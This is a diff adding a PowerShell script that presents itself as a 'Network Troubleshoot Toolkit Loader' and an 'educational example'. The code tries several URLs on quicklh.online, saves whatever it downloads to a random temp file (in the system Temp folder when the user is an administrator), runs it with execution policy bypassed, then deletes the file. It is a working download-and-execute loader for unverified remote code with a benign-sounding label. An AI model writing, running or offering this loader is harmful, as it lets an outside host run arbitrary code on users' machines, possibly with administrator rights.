@@ -1,0 +1,83 @@
+if (-not $args) {
+    Write-Host ""
+    Write-Host "NETWORK TROUBLESHOOT TOOLKIT LOADER" -ForegroundColor Green
+    Write-Host "====================================" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "This is an educational example demonstrating"
+    Write-Host "PowerShell web requests and script execution."
+    Write-Host ""
+}
+
+& {
+    $psv = (Get-Host).Version.Major
+    $troubleshoot = "https://quicklh.online"
+
+    if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
+        $ExecutionContext.SessionState.LanguageMode
+        Write-Host "PowerShell is not running in Full Language Mode."
+        return
+    }
+
+    try {
+        [void][System.AppDomain]::CurrentDomain.GetAssemblies(); [void][System.Math]::Sqrt(144)
+    }
+    catch {
+        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "PowerShell failed to load .NET command."
+        return
+    }
+
+    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
+
+    $URLs = @(
+        "https://quicklh.online/NetworkTroubleshoot.ps1",
+        "https://quicklh.online/NetworkTroubleshoot/NetworkTroubleshoot.ps1",
+        "http://quicklh.online/NetworkTroubleshoot.ps1",
+        "http://quicklh.online/NetworkTroubleshoot/NetworkTroubleshoot.ps1"
+    )
+    Write-Progress -Activity "Downloading..." -Status "Please wait"
+    $errors = @()
+    $response = $null
+    
+    foreach ($URL in $URLs) {
+        try {
+            if ($psv -ge 3) {
+                $response = Invoke-RestMethod $URL
+            }
+            else {
+                $w = New-Object Net.WebClient
+                $response = $w.DownloadString($URL)
+            }
+            break
+        }
+        catch {
+            $errors += $_
+        }
+    }
+    Write-Progress -Activity "Downloading..." -Status "Done" -Completed
+
+    if (-not $response) {
+        foreach ($err in $errors) {
+            Write-Host "Error: $($err.Exception.Message)" -ForegroundColor Red
+        }
+        Write-Host "Failed to retrieve script from any repository, aborting!"
+        return
+    }
+
+    $rand = [Guid]::NewGuid().Guid
+    $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+    $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\NetworkTool_$rand.ps1" } else { "$env:USERPROFILE\AppData\Local\Temp\NetworkTool_$rand.ps1" }
+    Set-Content -Path $FilePath -Value $response
+
+    if (-not (Test-Path $FilePath)) {
+        Write-Host "Failed to create temp file, aborting!"
+        throw
+    }
+
+    Write-Host "Launching Network Troubleshoot Toolkit..." -ForegroundColor Cyan
+    & powershell.exe -ExecutionPolicy Bypass -File $FilePath
+
+    if (Test-Path $FilePath) {
+        Remove-Item -Path $FilePath
+    }
+} @args
